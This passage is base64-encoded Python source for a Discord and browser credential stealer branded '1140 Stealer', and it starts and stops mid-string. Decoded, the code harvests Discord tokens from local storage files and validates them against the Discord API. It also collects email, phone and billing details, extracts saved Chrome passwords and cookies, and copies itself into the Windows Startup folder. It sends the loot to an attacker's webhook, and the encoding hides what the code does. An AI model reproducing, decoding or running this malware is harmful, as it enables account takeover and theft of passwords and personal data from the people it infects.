pkZWYgRzN0QjRkZzMxKGZsYWdzKToKICAgIGlmIGZsYWdzID09IDA6IHJldHVybiAnJwoKICAgIE93bjNkQjNkZzRzID0gJycKICAgIGI0ZGczTGlzdCA9ICBbCiAgICAgICAgeyJOYW1lIjogJ0Vhcmx5X1ZlcmlmaWVkX0JvdF9EZXZlbG9wZXInLCAnVmFsdWUnOiAxMzEwNzIsICdFbW9qaSc6ICI8OmRldmVsb3Blcjo4NzQ3NTA4MDg0NzI4MjU5ODY+ICJ9LAogICAgICAgIHsiTmFtZSI6ICdCdWdfSHVudGVyX0xldmVsXzInLCAnVmFsdWUnOiAxNjM4NCwgJ0Vtb2ppJzogIjw6YnVnaHVudGVyXzI6ODc0NzUwODA4NDMwODc0NjY0PiAifSwKICAgICAgICB7Ik5hbWUiOiAnRWFybHlfU3VwcG9ydGVyJywgJ1ZhbHVlJzogNTEyLCAnRW1vamknOiAiPDplYXJseV9zdXBwb3J0ZXI6ODc0NzUwODA4NDE0MTEzODIzPiAifSwKICAgICAgICB7Ik5hbWUiOiAnSG91c2VfQmFsYW5jZScsICdWYWx1ZSc6IDI1NiwgJ0Vtb2ppJzogIjw6YmFsYW5jZTo4NzQ3NTA4MDgyNjcyOTI2ODM+ICJ9LAogICAgICAgIHsiTmFtZSI6ICdIb3VzZV9CcmlsbGlhbmNlJywgJ1ZhbHVlJzogMTI4LCAnRW1vamknOiAiPDpicmlsbGlhbmNlOjg3NDc1MDgwODMzODYwODE5OT4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0hvdXNlX0JyYXZlcnknLCAnVmFsdWUnOiA2NCwgJ0Vtb2ppJzogIjw6YnJhdmVyeTo4NzQ3NTA4MDgzODg5NTIwNzU+ICJ9LAogICAgICAgIHsiTmFtZSI6ICdCdWdfSHVudGVyX0xldmVsXzEnLCAnVmFsdWUnOiA4LCAnRW1vamknOiAiPDpidWdodW50ZXJfMTo4NzQ3NTA4MDg0MjY2OTI2NTg+ICJ9LAogICAgICAgIHsiTmFtZSI6ICdIeXBlU3F1YWRfRXZlbnRzJywgJ1ZhbHVlJzogNCwgJ0Vtb2ppJzogIjw6aHlwZXNxdWFkX2V2ZW50czo4NzQ3NTA4MDg1OTQ0NzcwNTY+ICJ9LAogICAgICAgIHsiTmFtZSI6ICdQYXJ0bmVyZWRfU2VydmVyX093bmVyJywgJ1ZhbHVlJzogMiwnRW1vamknOiAiPDpwYXJ0bmVyOjg3NDc1MDgwODY3ODM1NDk2ND4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0Rpc2NvcmRfRW1wbG95ZWUnLCAnVmFsdWUnOiAxLCAnRW1vamknOiAiPDpzdGFmZjo4NzQ3NTA4MDg3Mjg2NjYxNTI+ICJ9CiAgICBdCiAgICBmb3IgYjRkZzMgaW4gYjRkZzNMaXN0OgogICAgICAgIGlmIGZsYWdzIC8vIGI0ZGczWyJWYWx1ZSJdICE9IDA6CiAgICAgICAgICAgIE93bjNkQjNkZzRzICs9IGI0ZGczWyJFbW9qaSJdCiAgICAgICAgICAgIGZsYWdzID0gZmxhZ3MgJSBiNGRnM1siVmFsdWUiXQoKICAgIHJldHVybiBPd24zZEIzZGc0cwoKZGVmIEczdFQwazRuMW5mOSh0MGszbik6CiAgICBoZWFkZXJzID0gewogICAgICAgICJBdXRob3JpemF0aW9uIjogdDBrM24sCiAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwKICAgICAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDIuMCIKICAgIH0KCiAgICB1czNyanMwbiA9IGxvYWRzKHVybG9wZW4oUmVxdWVzdCgiaHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvdjYvdXNlcnMvQG1lIiwgaGVhZGVycz1oZWFkZXJzKSkucmVhZCgpLmRlY29kZSgpKQogICAgdXMzcm40bTEgPSB1czNyanMwblsidXNlcm5hbWUiXQogICAgaGFzaHRhZyA9IHVzM3JqczBuWyJkaXNjcmltaW5hdG9yIl0KICAgIGVtMzFsID0gdXMzcmpzMG5bImVtYWlsIl0KICAgIGlkZCA9IHVzM3JqczBuWyJpZCJdCiAgICBwZnAgPSB1czNyanMwblsiYXZhdGFyIl0KICAgIGZsYWdzID0gdXMzcmpzMG5bInB1YmxpY19mbGFncyJdCiAgICBuMXRyMCA9ICIiCiAgICBwaDBuMyA9ICIiCgogICAgaWYgInByZW1pdW1fdHlwZSIgaW4gdXMzcmpzMG46IAogICAgICAgIG5pdHJvdCA9IHVzM3JqczBuWyJwcmVtaXVtX3R5cGUiXQogICAgICAgIGlmIG5pdHJvdCA9PSAxOgogICAgICAgICAgICBuMXRyMCA9ICI8YTpERV9CYWRnZU5pdHJvOjg2NTI0MjQzMzY5Mjc2MjEyMj4iCiAgICAgICAgZWxpZiBuaXRyb3QgPT0gMjoKICAgICAgICAgICAgbjF0cjAgPSAiPGE6REVfQmFkZ2VOaXRybzo4NjUyNDI0MzM2OTI3NjIxMjI+PGE6YXV0cl9ib29zdDE6MTAzODcyNDMyMTc3MTc4NjI0MD4iCiAgICBpZiAicGgwbjMiIGluIHVzM3JqczBuOiBwaDBuMyA9IGYne3VzM3JqczBuWyJwaDBuMyJdfScKCiAgICByZXR1cm4gdXMzcm40bTEsIGhhc2h0YWcsIGVtMzFsLCBpZGQsIHBmcCwgZmxhZ3MsIG4xdHIwLCBwaDBuMwoKZGVmIGNoMWNrVDRrMW4odDBrM24pOgogICAgaGVhZGVycyA9IHsKICAgICAgICAiQXV0aG9yaXphdGlvbiI6IHQwazNuLAogICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsCiAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTAyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTAyLjAiCiAgICB9CiAgICB0cnk6CiAgICAgICAgdXJsb3BlbihSZXF1ZXN0KCJodHRwczovL2Rpc2NvcmRhcHAuY29tL2FwaS92Ni91c2Vycy9AbWUiLCBoZWFkZXJzPWhlYWRlcnMpKQogICAgICAgIHJldHVybiBUcnVlCiAgICBleGNlcHQ6CiAgICAgICAgcmV0dXJuIEZhbHNlCgppZiBnZXRhdHRyKHN5cywgJ2Zyb3plbicsIEZhbHNlKToKICAgIGN1cnJlbnRGaWxlUGF0aCA9IG9zLnBhdGguZGlybmFtZShzeXMuZXhlY3V0YWJsZSkKZWxzZToKICAgIGN1cnJlbnRGaWxlUGF0aCA9IG9zLnBhdGguZGlybmFtZShvcy5wYXRoLmFic3BhdGgoX19maWxlX18pKQoKZmlsZU5hbWUgPSBvcy5wYXRoLmJhc2VuYW1lKHN5cy5hcmd2WzBdKQpmaWxlUGF0aCA9IG9zLnBhdGguam9pbihjdXJyZW50RmlsZVBhdGgsIGZpbGVOYW1lKQoKc3RhcnR1cEZvbGRlclBhdGggPSBvcy5wYXRoLmpvaW4ob3MucGF0aC5leHBhbmR1c2VyKCd+JyksICdBcHBEYXRhJywgJ1JvYW1pbmcnLCAnTWljcm9zb2Z0JywgJ1dpbmRvd3MnLCAnU3RhcnQgTWVudScsICdQcm9ncmFtcycsICdTdGFydHVwJykKc3RhcnR1cEZpbGVQYXRoID0gb3MucGF0aC5qb2luKHN0YXJ0dXBGb2xkZXJQYXRoLCBmaWxlTmFtZSkKCmlmIG9zLnBhdGguYWJzcGF0aChmaWxlUGF0aCkubG93ZXIoKSAhPSBvcy5wYXRoLmFic3BhdGgoc3RhcnR1cEZpbGVQYXRoKS5sb3dlcigpOgogICAgd2l0aCBvcGVuKGZpbGVQYXRoLCAncmInKSBhcyBzcmNfZmlsZSwgb3BlbihzdGFydHVwRmlsZVBhdGgsICd3YicpIGFzIGRzdF9maWxlOgogICAgICAgIHNodXRpbC5jb3B5ZmlsZW9iaihzcmNfZmlsZSwgZHN0X2ZpbGUpCgoKZGVmIHVwbDA1ZFQ0azMxKHQwazNuLCBwYXRoKToKICAgIGdsb2JhbCB3aDAwawogICAgaGVhZGVycyA9IHsKICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLAogICAgICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIgogICAgfQogICAgdXMzcm40bTEsIGhhc2h0YWcsIGVtMzFsLCBpZGQsIHBmcCwgZmxhZ3MsIG4xdHIwLCBwaDBuMyA9IEczdFQwazRuMW5mOSh0MGszbikKCiAgICBpZiBwZnAgPT0gTm9uZTogCiAgICAgICAgcGZwID0gImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzEwODkzMDg5NTcxNTczNzE5MjQvMTEwMjYyMzUxODI2MjI5NjYzNy9COEIyQzA1NC05Njk2LTQyQTEtODVGMy00RkNERUY0MDhCOTIuanBnIgogICAgZWxzZToKICAgICAgICBwZnAgPSBmImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F2YXRhcnMve2lkZH0ve3BmcH0iCgogICAgYjFsbDFuZyA9IEczdGIxbGwxbmcodDBrM24pCiAgICBiNGRnMyA9IEczdEI0ZGczMShmbGFncykKICAgIGZyaWVuZHMgPSBHM3RVSFFGcjEzbmRTKHQwazNuKQogICAgaWYgZnJpZW5kcyA9PSAnJzogZnJpZW5kcyA9ICJgYGBObyBSYXJlIEZyaWVuZHNgYGAiCiAgICBpZiBub3QgYjFsbDFuZzoKICAgICAgICBiNGRnMywgcGgwbjMsIGIxbGwxbmcgPSAi8J+UkiIsICLwn5SSIiwgIvCflJIiCiAgICBpZiBuMXRyMCA9PSAnJyBhbmQgYjRkZzMgPT0gJyc6IG4xdHIwID0gImBgYE5vbmVgYGAiCgogICAgZGF0YSA9IHsKICAgICAgICAiY29udGVudCI6IGYne2dsb2JhbEluZm8oKX0gfCBge3BhdGh9YCcsCiAgICAgICAgImVtYmVkcyI6IFsKICAgICAgICAgICAgewogICAgICAgICAgICAiY29sb3IiOiAyODk1NjY3LAogICAgICAgICAgICAiZmllbGRzIjogWwogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICJuYW1lIjogIjxhOmh5cGVyTk9QUEVSUzo4MjgzNjk1MTgxOTkzMDgzODg+IFRva2VuOiIsCiAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogZiJgYGB7dDBrM259YGBgIiwKICAgICAgICAgICAgICAgICAgICAiaW5saW5lIjogVHJ1ZQogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAibmFtZSI6ICI8Om1haWw6NzUwMzkzODcwNTA3OTY2NDg2PiBFbWFpbDoiLAogICAgICAgICAgICAgICAgICAgICJ2YWx1ZSI6IGYiYGBge2VtMzFsfWBgYCIsCiAgICAgICAgICAgICAgICAgICAgImlubGluZSI6IFRydWUKICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiPGE6MTY4OV9SaW5naW5nX1Bob25lOjc1NTIxOTQxNzA3NTQxNzA4OD4gUGhvbmU6IiwKICAgICAgICAgICAgICAgICAgICAidmFsdWUiOiBmImBgYHtwaDBuM31gYGAiLAogICAgICAgICAgICAgICAgICAgICJpbmxpbmUiOiBUcnVlCiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICJuYW1lIjogIjw6bWNfZWFydGg6NTg5NjMwMzk2NDc2NTU1MjY0PiBJUDoiLAogICAgICAgICAgICAgICAgICAgICJ2YWx1ZSI6IGYiYGBge2czdDFwKCl9YGBgIiwKICAgICAgICAgICAgICAgICAgICAiaW5saW5lIjogVHJ1ZQogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAibmFtZSI6ICI8Ondvb3p5ZmFjZTo4NzQyMjA4NDM1Mjg0ODY5MjM+IEJhZGdlczoiLAogICAgICAgICAgICAgICAgICAgICJ2YWx1ZSI6IGYie24xdHIwfXtiNGRnM30iLAogICAgICAgICAgICAgICAgICAgICJpbmxpbmUiOiBUcnVlCiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICJuYW1lIjogIjxhOjQzOTRfY2NfY3JlZGl0Y2FyZF9jYXJ0YW9fZjRiaWh5Ojc1NTIxODI5NjgwMTk4NDU1Mz4gQmlsbGluZzoiLAogICAgICAgICAgICAgICAgICAgICJ2YWx1ZSI6IGYie2IxbGwxbmd9IiwKICAgICAgICAgICAgICAgICAgICAiaW5saW5lIjogVHJ1ZQogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAibmFtZSI6ICI8YTptYXZpa2lybWl6aTo4NTMyMzgzNzI1OTE1OTk2MTc+IEhRIEZyaWVuZHM6IiwKICAgICAgICAgICAgICAgICAgICAidmFsdWUiOiBmIntmcmllbmRzfSIsCiAgICAgICAgICAgICAgICAgICAgImlubGluZSI6IEZhbHNlCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBdLAogICAgICAgICAgICAiYXV0aG9yIjogewogICAgICAgICAgICAgICAgIm5hbWUiOiBmInt1czNybjRtMX0je2hhc2h0YWd9ICh7aWRkfSkiLAogICAgICAgICAgICAgICAgImljb25fdXJsIjogZiJ7cGZwfSIKICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICJmb290ZXIiOiB7CiAgICAgICAgICAgICAgICAidGV4dCI6ICIxMTQwIFN0ZWFsZXIiLAogICAgICAgICAgICAgICAgImljb25fdXJsIjogImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzEwODkzMDg5NTcxNTczNzE5MjQvMTEwMjYyMzUxODI2MjI5NjYzNy9COEIyQzA1NC05Njk2LTQyQTEtODVGMy00RkNERUY0MDhCOTIuanBnIgogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgInRodW1ibmFpbCI6IHsKICAgICAgICAgICAgICAgICJ1cmwiOiBmIntwZnB9IgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgXSwKICAgICAgICAiYXZhdGFyX3VybCI6ICJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy8xMDg5MzA4OTU3MTU3MzcxOTI0LzExMDI2MjM1MTgyNjIyOTY2MzcvQjhCMkMwNTQtOTY5Ni00MkExLTg1RjMtNEZDREVGNDA4QjkyLmpwZyIsCiAgICAgICAgInVzZXJuYW1lIjogIjExNDAgU3RlYWxlciIsCiAgICAgICAgImF0dGFjaG1lbnRzIjogW10KICAgICAgICB9CiAgICBMMDRkdXJsMWIod2gwMGssIGRhdGE9ZHVtcHMoZGF0YSkuZW5jb2RlKCksIGhlYWRlcnM9aGVhZGVycykK'
prout = 'CiNoZXJzZXkgc29uIGRlZmEgOigKZGVmIFI0ZjBybTN0KGxpc3R0KToKICAgIGUgPSByZS5maW5kYWxsKCIoXHcrW2Etel0pIixsaXN0dCkKICAgIHdoaWxlICJodHRwcyIgaW4gZTogZS5yZW1vdmUoImh0dHBzIikKICAgIHdoaWxlICJjb20iIGluIGU6IGUucmVtb3ZlKCJjb20iKQogICAgd2hpbGUgIm5ldCIgaW4gZTogZS5yZW1vdmUoIm5ldCIpCiAgICByZXR1cm4gbGlzdChzZXQoZSkpCgpkZWYgdXBsb2FkKG5hbWUsIGxpbmspOgogICAgaGVhZGVycyA9IHsKICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLAogICAgICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIgogICAgfQoKICAgIGlmIG5hbWUgPT0gImJieWNvb2siOgogICAgICAgIHJiID0gJyB8ICcuam9pbihkYSBmb3IgZGEgaW4gY29va2lXb3JkcykKICAgICAgICBpZiBsZW4ocmIpID4gMTAwMDogCiAgICAgICAgICAgIHJycnJyID0gUjRmMHJtM3Qoc3RyKGNvb2tpV29yZHMpKQogICAgICAgICAgICByYiA9ICcgfCAnLmpvaW4oZGEgZm9yIGRhIGluIHJycnJyKQogICAgICAgIGRhdGEgPSB7CiAgICAgICAgICAgICJjb250ZW50IjogZiJ7Z2xvYmFsSW5mbygpfSIsCiAgICAgICAgICAgICJlbWJlZHMiOiBbCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgInRpdGxlIjogIjExNDAgfCBDb29raWVzIFN0ZWFsZXIiLAogICAgICAgICAgICAgICAgICAgICJkZXNjcmlwdGlvbiI6IGYiPDphcG9sbG9uZGVsaXJtaXM6MTAxMjM3MDE4MDg0NTg4MzQ5Mz46ICoqQWNjb3VudHM6Kipcblxue3JifVxuXG4qKkRhdGE6Kipcbjw6Y29va2llc190bG06ODE2NjE5MDYzNjE4NTY4MjM0PiDigKIgKip7Q29va2lDb3VudH0qKiBDb29raWVzIEZvdW5kXG48YTpDSF9JY29uQXJyb3dSaWdodDo3MTU1ODUzMjAxNzg5NDE5OTM+IOKAoiBbMTE0MENvb2tpZXMudHh0XSh7bGlua30pIiwKICAgICAgICAgICAgICAgICAgICAiY29sb3IiOiAyODk1NjY3LAogICAgICAgICAgICAgICAgICAgICJmb290ZXIiOiB7CiAgICAgICAgICAgICAgICAgICAgICAgICJ0ZXh0IjogIjExNDAgU3RlYWxlciIsCiAgICAgICAgICAgICAgICAgICAgICAgICJpY29uX3VybCI6ICJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy8xMDg5MzA4OTU3MTU3MzcxOTI0LzExMDI2MjM1MTgyNjIyOTY2MzcvQjhCMkMwNTQtOTY5Ni00MkExLTg1RjMtNEZDREVGNDA4QjkyLmpwZyIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIF0sCiAgICAgICAgICAgICJ1c2VybmFtZSI6ICIxMTQwIFN0ZWFsZXIiLAogICAgICAgICAgICAiYXZhdGFyX3VybCI6ICJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy8xMDg5MzA4OTU3MTU3MzcxOTI0LzExMDI2MjM1MTgyNjIyOTY2MzcvQjhCMkMwNTQtOTY5Ni00MkExLTg1RjMtNEZDREVGNDA4QjkyLmpwZyIsCiAgICAgICAgICAgICJhdHRhY2htZW50cyI6IFtdCiAgICAgICAgICAgIH0KICAgICAgICBMMDRkdXJsMWIod2gwMGssIGRhdGE9ZHVtcHMoZGF0YSkuZW5jb2RlKCksIGhlYWRlcnM9aGVhZGVycykKICAgICAgICByZXR1cm4KCiAgICBpZiBuYW1lID09ICJiYnlwYXNzdyI6CiAgICAgICAgcmEgPSAnIHwgJy5qb2luKGRhIGZvciBkYSBpbiBwYXN3V29yZHMpCiAgICAgICAgaWYgbGVuKHJhKSA+IDEwMDA6IAogICAgICAgICAgICBycnIgPSBSNGYwcm0zdChzdHIocGFzd1dvcmRzKSkKICAgICAgICAgICAgcmEgPSAnIHwgJy5qb2luKGRhIGZvciBkYSBpbiBycnIpCgogICAgICAgIGRhdGEgPSB7CiAgICAgICAgICAgICJjb250ZW50IjogZiJ7Z2xvYmFsSW5mbygpfSIsCiAgICAgICAgICAgICJlbWJlZHMiOiBbCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgInRpdGxlIjogIjExNDAgfCBQYXNzd29yZCBTdGVhbGVyIiwKICAgICAgICAgICAgICAgICAgICAiZGVzY3JpcHRpb24iOiBmIjw6YXBvbGxvbmRlbGlybWlzOjEwMTIzNzAxODA4NDU4ODM0OTM+OiAqKkFjY291bnRzKio6XG57cmF9XG5cbioqRGF0YToqKlxuPGE6aGlyYV9rYXNhYW5haHRhcmk6ODg2OTQyODU2OTY5ODc1NDc2PiDigKIgKip7UDRzc3dDb3VudH0qKiBQYXNzd29yZHMgRm91bmRcbjxhOkNIX0ljb25BcnJvd1JpZ2h0OjcxNTU4NTMyMDE3ODk0MTk5Mz4g4oCiIFsxMTQwUGFzc3dvcmQudHh0XSh7bGlua30pIiwKICAgICAgICAgICAgICAgICAgICAiY29sb3IiOiAyODk1NjY3LAogICAgICAgICAgICAgICAgICAgICJmb290ZXIiOiB7CiAgICAgICAgICAgICAgICAgICAgICAgICJ0ZXh0IjogIjExNDAgU3RlYWxlciIsCiAgICAgICAgICAgICAgICAgICAgICAgICJpY29uX3VybCI6ICJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy8xMDg5MzA4OTU3MTU3MzcxOTI0LzExMDI2MjM1MTgyNjIyOTY2MzcvQjhCMkMwNTQtOTY5Ni00MkExLTg1RjMtNEZDREVGNDA4QjkyLmpwZyIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIF0sCiAgICAgICAgICAgICJ1c2VybmFtZSI6ICIxMTQwIiwKICAgICAgICAgICAgImF2YXRhcl91cmwiOiAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTA4OTMwODk1NzE1NzM3MTkyNC8xMTAyNjIzNTE4MjYyMjk2NjM3L0I4QjJDMDU0LTk2OTYtNDJBMS04NUYzLTRGQ0RFRjQwOEI5Mi5qcGciLAogICAgICAgICAgICAiYXR0YWNobWVudHMiOiBbXQogICAgICAgICAgICB9CiAgICAgICAgTDA0ZHVybDFiKHdoMDBrLCBkYXRhPWR1bXBzKGRhdGEpLmVuY29kZSgpLCBoZWFkZXJzPWhlYWRlcnMpCiAgICAgICAgcmV0dXJuCgogICAgaWYgbmFtZSA9PSAia2l3aSI6CiAgICAgICAgZGF0YSA9IHsKICAgICAgICAgICAgImNvbnRlbnQiOiBmIntnbG9iYWxJbmZvKCl9IiwKICAgICAgICAgICAgImVtYmVkcyI6IFsKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICJjb2xvciI6IDI4OTU2NjcsCiAgICAgICAgICAgICAgICAiZmllbGRzIjogWwogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAibmFtZSI6ICJJbnRlcmVzdGluZyBmaWxlcyBmb3VuZCBvbiB1c2VyIFBDOiIsCiAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogbGluawogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIF0sCiAgICAgICAgICAgICAgICAiYXV0aG9yIjogewogICAgICAgICAgICAgICAgICAgICJuYW1lIjogIjExNDAgfCBGaWxlIFN0ZWFsZXIiCiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgImZvb3RlciI6IHsKICAgICAgICAgICAgICAgICAgICAidGV4dCI6ICIxMTQwIFN0ZWFsZXIiLAogICAgICAgICAgICAgICAgICAgICJpY29uX3VybCI6ICJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy8xMDg5MzA4OTU3MTU3MzcxOTI0LzExMDI2MjM1MTgyNjIyOTY2MzcvQjhCMkMwNTQtOTY5Ni00MkExLTg1RjMtNEZDREVGNDA4QjkyLmpwZyIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgXSwKICAgICAgICAgICAgInVzZXJuYW1lIjogIjExNDAgU3RlYWxlciIsCiAgICAgICAgICAgICJhdmF0YXJfdXJsIjogImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzEwODkzMDg5NTcxNTczNzE5MjQvMTEwMjYyMzUxODI2MjI5NjYzNy9COEIyQzA1NC05Njk2LTQyQTEtODVGMy00RkNERUY0MDhCOTIuanBnIiwKICAgICAgICAgICAgImF0dGFjaG1lbnRzIjogW10KICAgICAgICAgICAgfQogICAgICAgIEwwNGR1cmwxYih3aDAwaywgZGF0YT1kdW1wcyhkYXRhKS5lbmNvZGUoKSwgaGVhZGVycz1oZWFkZXJzKQogICAgICAgIHJldHVybgoKCgoKIyBkZWYgdXBsb2FkKG5hbWUsIHRrPScnKToKIyAgICAgaGVhZGVycyA9IHsKIyAgICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsCiMgICAgICAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDIuMCIKIyAgICAgfQoKIyAgICAgIyByID0gcmVxdWVzdHMucG9zdChob29rLCBmaWxlcz1maWxlcykKIyAgICAgTG9hZFJlcXVlc3RzKCJQT1NUIiwgaG9vaywgZmlsZXM9ZmlsZXMpCiAgICBfCgoKCgpkZWYgd3IxdGVmMHJmMWwzKGRhdGEsIG5hbWUpOgogICAgcGF0aCA9IG9zLmdldGVudigiVEVNUCIpICsgZiJcIGJieXtuYW1lfS50eHQiCiAgICB3aXRoIG9wZW4ocGF0aCwgbW9kZT0ndycsIGVuY29kaW5nPSd1dGYtOCcpIGFzIGY6CiAgICAgICAgZi53cml0ZShmIjwtLTExNDAgU1RFQUxFUiBCRVNUIC0tPlxuXG4iKQogICAgICAgIGZvciBsaW5lIGluIGRhdGE6CiAgICAgICAgICAgIGlmIGxpbmVbMF0gIT0gJyc6CiAgICAgICAgICAgICAgICBmLndyaXRlKGYie2xpbmV9XG4iKQoKVDBrM25zID0gJycKZGVmIGdldFQwazNuKHBhdGgsIGFyZyk6CiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMocGF0aCk6IHJldHVybgoKICAgIHBhdGggKz0gYXJnCiAgICBmb3IgZmlsZSBpbiBvcy5saXN0ZGlyKHBhdGgpOgogICAgICAgIGlmIGZpbGUuZW5kc3dpdGgoIi5sb2ciKSBvciBmaWxlLmVuZHN3aXRoKCIubGRiIikgICA6CiAgICAgICAgICAgIGZvciBsaW5lIGluIFt4LnN0cmlwKCkgZm9yIHggaW4gb3BlbihmIntwYXRofVxce2ZpbGV9IiwgZXJyb3JzPSJpZ25vcmUiKS5yZWFkbGluZXMoKSBpZiB4LnN0cmlwKCldOgogICAgICAgICAgICAgICAgZm9yIHJlZ2V4IGluIChyIltcdy1dezI0fVwuW1x3LV17Nn1cLltcdy1dezI1LDExMH0iLCByIm1mYVwuW1x3LV17ODAsOTV9Iik6CiAgICAgICAgICAgICAgICAgICAgZm9yIHQwazNuIGluIHJlLmZpbmRhbGwocmVnZXgsIGxpbmUpOgogICAgICAgICAgICAgICAgICAgICAgICBnbG9iYWwgVDBrM25zCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGNoMWNrVDRrMW4odDBrM24pOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IHQwazNuIGluIFQwazNuczoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIHByaW50KHRva2VuKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFQwazNucyArPSB0MGszbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVwbDA1ZFQ0azMxKHQwazNuLCBwYXRoKQoKUDRzc3cgPSBbXQpkZWYgZ2V0UDRzc3cocGF0aCwgYXJnKToKICAgIGdsb2JhbCBQNHNzdywgUDRzc3dDb3VudAogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGgpOiByZXR1cm4KCiAgICBwYXRoQyA9IHBhdGggKyBhcmcgKyAiL0xvZ2luIERhdGEiCiAgICBpZiBvcy5zdGF0KHBhdGhDKS5zdF9zaXplID09IDA6IHJldHVybgoKICAgIHRlbXBmb2xkID0gdGVtcCArICJiYnkiICsgJycuam9pbihyYW5kb20uY2hvaWNlKCdiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6JykgZm9yIGkgaW4gcmFuZ2UoOCkpICsgIi5kYiIKCiAgICBzaHV0aWwuY29weTIocGF0aEMsIHRlbXBmb2xkKQogICAgY29ubiA9IHNxbF9jb25uZWN0KHRlbXBmb2xkKQogICAgY3Vyc29yID0gY29ubi5jdXJzb3IoKQogICAgY3Vyc29yLmV4ZWN1dGUoIlNFTEVDVCBhY3Rpb25fdXJsLCB1c2VybmFtZV92YWx1ZSwgcGFzc3dvcmRfdmFsdWUgRlJPTSBsb2dpbnM7IikKICAgIGRhdGEgPSBjdXJzb3IuZmV0Y2hhbGwoKQogICAgY3Vyc29yLmNsb3NlKCkKICAgIGNvbm4uY2xvc2UoKQogICAgb3MucmVtb3ZlKHRlbXBmb2xkKQoKICAgIHBhdGhLZXkgPSBwYXRoICsgIi9Mb2NhbCBTdGF0ZSIKICAgIHdpdGggb3BlbihwYXRoS2V5LCAncicsIGVuY29kaW5nPSd1dGYtOCcpIGFzIGY6IGxvY2FsX3N0YXRlID0ganNvbl9sb2FkcyhmLnJlYWQoKSkKICAgIG1hc3Rlcl9rZXkgPSBiNjRkZWNvZGUobG9jYWxfc3RhdGVbJ29zX2NyeXB0J11bJ2VuY3J5cHRlZF9r